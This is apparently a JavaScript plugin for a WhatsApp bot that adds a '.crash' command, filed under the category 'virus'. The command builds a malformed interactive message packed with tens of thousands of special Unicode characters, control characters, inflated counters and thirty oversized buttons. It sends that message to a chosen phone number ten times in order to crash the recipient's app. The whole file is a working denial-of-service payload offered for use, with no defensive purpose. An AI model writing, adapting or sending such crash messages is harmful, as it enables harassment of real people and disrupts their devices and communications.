const { cmd } = require('../command');

const normalizeNumber = (number) => {
    return number.replace(/[^0-9]/g, '');
};

// ✅ Universal phone number support (any country)
const isValidPhoneNumber = (number) => {
    const cleaned = number.replace(/[^0-9]/g, '');
    return /^[1-9][0-9]{7,14}$/.test(cleaned);
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function sendCrashMessage(conn, targetJid) {
    const venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            _eventsCount: 999999,
            _maxListeners: 0,
        }
    });

    const longChar = "\u200E".repeat(1024) + "ꦽ".repeat(80000);

    const message = {
        text: ".",
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    unreadCount: 9999,
                    forwardingScore: 7777777,
                    isStatusBroadcast: true,
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    newsletterName: `𝐀𝖑𝖙𝖊𝖗 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝕭𝖊𝖙𝖆 𝖁𝟐 ☠️ ${"ꥈ".repeat(15)}`,
                    accessibilityText: `𝗕𝗘𝗧𝗔 💢 ${"﹏".repeat(2048)}`
                },
                interactiveMessage: {
                    body: {
                        text: longChar
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 30 }, () => ({
                            name: "single_select",
                            buttonParamsJson: venomModsData + "\u0003".repeat(2048)
                        }))
                    }
                }
            }
        }
    };

    await conn.sendMessage(targetJid, message);
}

cmd({
    pattern: "crash",
    alias: ["beta-crash", "alter"],
    desc: "Sends a multi-payload crash message to a target.",
    category: "virus",
    react: "☠️",
    filename: __filename
},
async (conn, mek, m, { from, args, q, reply }) => {
    try {
        const ownerNumber = "923151105391";

        const senderNumber = normalizeNumber(m.sender.split('@')[0]);
        if (senderNumber !== ownerNumber) {
            return reply(`😤 YOU VILE IMPOSTOR! Trying to wield ${ownerNumber}’s destructive power? Begone! 🚫`);
        }

        if (!q) {
            return reply(`😡 YOU FOOL! Provide a target number! Format: .crash 923xxxxxxxxx or any valid number`);
        }

        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q;
        let targetNumber = target.includes('@') ? target.split('@')[0] : target;
        
        targetNumber = normalizeNumber(targetNumber);

        if (!isValidPhoneNumber(targetNumber)) {
            return reply(`😤 Invalid number! Use correct format like 923xxxxxxxxx or tag/quote a user.`);
        }

        const targetJid = `${targetNumber}@s.whatsapp.net`;

        await conn.sendMessage(from, { react: { text: '🔍', key: m.key } });

        for (let i = 0; i < 5; i++) {
            await sendCrashMessage(conn, targetJid);
            await sleep(5000);
            await sendCrashMessage(conn, targetJid);
        }

        await conn.sendMessage(from, { react: { text: '✅', key: m.key } });

        const successMessage = `◈ *Information Attack* ◈\n❒ Target: ${targetNumber}\n❒ Status: Success\n❒ Powered by Qadeer_Khan`;
        await reply(successMessage);

    } catch (e) {
        console.error("Error in Crash command:", e);
        reply(`😤 OUTRAGEOUS! Attack failed: ${e.message}!`);
    }
});